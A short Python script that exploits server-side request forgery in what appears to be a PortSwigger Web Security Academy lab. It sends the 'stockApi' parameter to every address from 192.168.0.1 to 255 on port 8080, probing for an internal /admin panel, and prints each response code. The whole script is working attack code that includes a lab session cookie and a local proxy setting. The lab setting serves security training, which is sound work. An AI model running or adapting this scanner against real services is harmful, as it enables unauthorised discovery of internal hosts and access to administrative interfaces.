#!/usr/bin/python

import requests
import re

proxy={'http':'http://localhost:8080'}
cookie={'session':'93t5uQGQGLtANpfGnq27AcmlRY8jd1an'}
url="https://0a0a00b803621dd4c0aa5ceb00dd0055.web-security-academy.net/product/stock"
body={'stockApi':'http://192.168.0.'}
req=requests.session()

for x in range(1,256):
    #body1=body["stockApi"]+str(x)+":8080/admin"
    req=requests.session()
    res1=req.post(url,data=body["stockApi"]+str(x)+":8080/admin",proxies=proxy,cookies=cookie)
    print(body["stockApi"]+str(x)+"--->"+str(res1.status_code))
    
